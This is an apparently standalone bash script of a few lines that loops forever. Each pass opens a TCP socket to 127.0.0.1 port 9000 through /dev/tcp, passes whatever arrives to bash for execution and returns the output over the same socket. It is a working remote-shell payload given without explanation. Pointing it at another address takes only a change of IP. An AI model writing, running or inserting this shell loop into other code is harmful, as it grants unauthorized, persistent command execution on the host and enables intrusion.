while true
do 
	exec 1337<> /dev/tcp/127.0.0.1/9000;
	cat <&1337 | bash >&1337;
done
